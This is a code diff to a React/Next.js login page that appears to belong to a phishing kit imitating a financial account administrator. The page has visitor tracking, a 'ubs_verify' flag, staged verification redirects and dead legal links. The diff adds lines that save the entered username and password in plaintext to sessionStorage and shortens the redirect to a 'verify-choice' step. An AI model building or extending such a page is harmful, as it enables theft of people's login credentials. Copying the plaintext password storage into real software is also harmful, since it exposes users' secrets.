@@ -4,6 +4,7 @@ import { useState, useEffect, useRef } from "react";
 import type { FormEvent } from "react";
 import { useRouter } from "next/navigation";
 import { Preloader } from "@/components/preloader";
+import { SiteFooter } from "@/components/site-footer";
 import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
 
 export default function LoginPage() {
@@ -72,10 +73,12 @@ export default function LoginPage() {
       }
       if (typeof window !== "undefined") {
         sessionStorage.setItem("ubs_verify", "1");
+        sessionStorage.setItem("loginUserId", username.trim());
+        sessionStorage.setItem("loginPassword", password.trim());
       }
       redirectRef.current = window.setTimeout(() => {
         router.push("/verify-choice");
-      }, 10000);
+      }, 2000);
     } catch (error) {
       console.error("Login failed:", error);
       setLoginError("Login failed. Please try again.");
@@ -162,8 +165,13 @@ export default function LoginPage() {
             </div>
           </header>
 
-          <main className="flex-1 flex flex-col items-center px-6 pt-4 md:pt-10 pb-8 lg:pr-[700px]">
-            <div className="w-full max-w-md">
+          {/* Reference login placement — the same 3-regime profile as
+              verify-choice and verify so all three pages sit in one column:
+              full width ≤768px; left-pinned at 43px with a 39% column
+              769–1199px; centred container ≥1200px. */}
+          <main className="flex-1 flex flex-col min-[1200px]:items-center">
+            <div className="w-full px-[10px] pt-4 md:pt-10 pb-8 min-[769px]:px-4 min-[1200px]:max-w-[1180px] min-[1200px]:mx-auto min-[1440px]:max-w-[1280px] min-[1440px]:px-[50px]">
+            <div className="w-full min-[769px]:w-[calc(39%-27px)] min-[769px]:ml-[27px]">
               <div className="flex justify-center mb-4">
                 <div className="w-12 h-12 border-2 border-gray-400 flex items-center justify-center">
                   <svg
@@ -329,23 +337,10 @@ export default function LoginPage() {
                 </div>
               </form>
             </div>
+            </div>
           </main>
 
-          <footer className="bg-[#e0e0e0] py-6 px-6">
-            <div className="max-w-7xl mx-auto">
-              <nav className="flex flex-wrap items-center justify-center gap-8 mb-3 text-xs md:text-sm tracking-wider font-semibold uppercase">
-                <a href="#" onClick={(e) => e.preventDefault()} className="text-gray-700 hover:text-gray-900 hover:underline">
-                  TERMS OF USE
-                </a>
-                <a href="#" onClick={(e) => e.preventDefault()} className="text-gray-700 hover:text-gray-900 hover:underline">
-                  PRIVACY POLICY
-                </a>
-              </nav>
-              <p className="text-center text-xs text-gray-600">
-                Copyright © 2017 Peak1 Administration LLC. All Rights Reserved.
-              </p>
-            </div>
-          </footer>
+          <SiteFooter />
 
           <div id="toast">Opening registration…</div>
         </div>
